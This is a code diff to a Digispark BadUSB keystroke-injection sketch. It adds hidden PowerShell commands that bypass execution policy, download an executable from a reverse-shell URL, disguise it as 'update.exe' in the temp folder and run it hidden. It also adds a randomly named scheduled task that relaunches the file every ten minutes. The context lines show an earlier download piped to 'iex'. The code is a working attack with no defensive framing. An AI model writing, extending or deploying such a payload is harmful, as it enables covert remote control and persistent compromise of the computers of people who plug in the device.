@@ -20,6 +20,24 @@ void setup() {
   
   DigiKeyboard.print(F(" -UseBasicParsing | iex }\""));
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(500);
+
+  // --- Step 3: Stealthy reverse shell execution ---
+  DigiKeyboard.print(F("powershell -ep bypass -w hidden -c \""));
+  DigiKeyboard.print(F("$wc=New-Object Net.WebClient;$wc.DownloadFile('"));
+  DigiKeyboard.print(REVERSE_SHELL_URL);
+  DigiKeyboard.print(F("','%TEMP%\\update.exe');Start-Process '%TEMP%\\update.exe' -WindowStyle Hidden"));
+  DigiKeyboard.print(F("\""));
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(500);
+
+  // --- Step 4: Create persistence with random task name ---
+  DigiKeyboard.print(F("powershell -ep bypass -w hidden -c \""));
+  DigiKeyboard.print(F("$rn=[guid]::NewGuid().ToString().Substring(0,8);"));
+  DigiKeyboard.print(F("schtasks /create /tn \"$rn\" /tr \"%TEMP%\\update.exe\" /sc minute /mo 10 /f"));
+  DigiKeyboard.print(F("\""));
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(500);
 }
 
 void loop() {}
